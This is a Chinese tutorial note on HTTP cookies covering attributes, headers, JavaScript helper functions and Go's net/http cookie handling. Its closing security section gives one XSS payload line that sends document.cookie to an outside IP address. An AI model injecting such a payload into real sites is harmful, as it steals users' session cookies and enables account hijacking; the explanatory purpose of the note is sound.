# Cookie

HTTP Cookie（也叫Web Cookie或浏览器Cookie）是服务器发送到用户浏览器并保存在本地的一小块数据，它会在浏览器下次向同一服务器再发起请求时被携带并发送到服务器上。通常，它用于告知服务端两个请求是否来自同一浏览器，如保持用户的登录状态。Cookie使基于无状态的HTTP协议记录稳定的状态信息成为了可能。

## cookie属性

|  名称 |  键名 | 作用  |
| ------------ | ------------ | ------------ |
|  名称 |  Name |  cookie的名称 |
|  内容 |  Value |  cookie的值 |
|  域名 |  Domain |  cookie存在的域名 |
|  路径 |  Path |  指定uri路径之下生效 |
|  过期时间 |  Expire |  失效时间 |
|  是否安全 |  Secure |  是否只能用于https |
|  是否仅用于http |  HttpOnly |  是否仅用于http传输 true时阅览器document无法读取 |

## http

在http协议中，agent请求时候一般会自动添加[Cookie][2] Header，值就是cookie键值对。

如果服务端修改cookie，在Response Header里面会有[Set-Cookie][3] Header，agent会根据值来修改自身cookie。

通过查看http请求和响应或者抓包可以发现，请求cookie header就是服务端收到的cookie数据，而服务端设置cookie后，响应里面就有set-cookie header，值就是服务端设置的属性。

详细情况请看[rfc][1]。


### 客户端js操作cookie

简单来说cookies就是阅览器里面一个叫做document.cookie的全局字符串对象

进入阅览器控制台输入`console.log(document.cookie)`,回车执行就可以看见当前站点的cookies。

发现cookies就是一段序列化的键值字符串,如果需要操作cookie，则是通过操作document.cookie字符串来达到效果。

阅览器中cookies会随http请求自动发送,在request中会有cookie和Set-Cookie这两个header,里面就是cookie,h5的fetch需要指定是否发送cookies,默认不发送cookies

js操作cookie数据，直接读写document.cookie对象，封装函数如下：

```js
"use strict";
function getCookie(name){
	var arr, reg = new RegExp("(^| )" + name + "=([^;]*)(;|$)");
	if(arr = document.cookie.match(reg))
		return unescape(arr[2]);
	else
		return null;
}

function setCookie(name, value, expiredays){
	var exp = new Date();
	exp.setDate(exp.getDate() + expiredays)
	document.cookie = name + "=" + escape(value) + ((expiredays==null) ? "" : ";expires=" + exp.toGMTString())
}

function delCookie(name){
	var exp = new Date();
	exp.setTime(exp.getTime() - 1);
	document.cookie = name + "=;expires=" + exp.toGMTString();
}
```


## 服务端go操作cookie

[net/http.Cookie][1]定义：

```golang
type Cookie struct {
        Name  string
        Value string

        Path       string    // optional
        Domain     string    // optional
        Expires    time.Time // optional
        RawExpires string    // for reading cookies only

        // MaxAge=0 means no 'Max-Age' attribute specified.
        // MaxAge<0 means delete cookie now, equivalently 'Max-Age: 0'
        // MaxAge>0 means Max-Age attribute present and given in seconds
        MaxAge   int
        Secure   bool
        HttpOnly bool
        SameSite SameSite // Go 1.11
        Raw      string
        Unparsed []string // Raw text of unparsed attribute-value pairs
}
```

查看net/http定义的函数，可以发现读Cookie实现是读取Request.Header里面的Cookie header；而修改Cookie就设置ResponseWriter.Header()里面的Set-Cookie header，例如setcookie。

### Example

操作cookie

```go
// 设置Cookie
cookie := http.Cookie{Name: "testcookiename", Value: "testcookievalue", Path: "/", MaxAge: 86400}
http.SetCookie(w, &cookie)
 
// 读取Cookie
cookie, err := req.Cookie("testcookiename")

// 删除Cookie
cookie := http.Cookie{Name: "testcookiename", Path: "/", MaxAge: -1}
http.SetCookie(w, &cookie)
```


### Get

`net/http.Request.Cookies() []*Cookie`方法就是通过读取`net/http.Request.Header["cookie"]`的值，分析出cookie键值对来构造cookie，每次读取cookie都会出来一次，效率调低。

readCookies函数过长不列出。

### Set

`net/http.SetCookie(w ResponseWriter, cookie *Cookie)`方法定义，直接将要设置的cookie序列化成字符串，给response添加Set-Cookie Header，添加多个Cookie就将Set-Cookie Header添加多次。


`net/http.Cookie.Srting()`方法就是Cookie对象的序列化的方法，会将多种属性组合成字符串。

例如：路径、域名、过期时间、只读、仅https这些属性。

以下是SetCookie和修改请求Cookie的AddCookie函数实现：

```golang
// SetCookie adds a Set-Cookie header to the provided ResponseWriter's headers.
// The provided cookie must have a valid Name. Invalid cookies may be
// silently dropped.
func SetCookie(w ResponseWriter, cookie *Cookie) {
	if v := cookie.String(); v != "" {
		w.Header().Add("Set-Cookie", v)
	}
}

// AddCookie adds a cookie to the request. Per RFC 6265 section 5.4,
// AddCookie does not attach more than one Cookie header field. That
// means all cookies, if any, are written into the same line,
// separated by semicolon.
func (r *Request) AddCookie(c *Cookie) {
	s := fmt.Sprintf("%s=%s", sanitizeCookieName(c.Name), sanitizeCookieValue(c.Value))
	if c := r.Header.Get("Cookie"); c != "" {
		r.Header.Set("Cookie", c+"; "+s)
	} else {
		r.Header.Set("Cookie", s)
	}
}
```



## 安全

### XSS

XSS触发后盗取cookie信息，然后使用Cookie信息操作。

`<script>window.open('http://10.65.20.196:8080/cookie.asp?msg='+document.cookie)</script>`

### CSRF

cookie是CSRF基本触发条件之一。

[1]: https://tools.ietf.org/html/rfc6265
[2]: https://developer.mozilla.org/zh-CN/docs/Web/HTTP/Headers/Cookie
[3]: https://developer.mozilla.org/zh-CN/docs/Web/HTTP/Headers/Set-Cookie
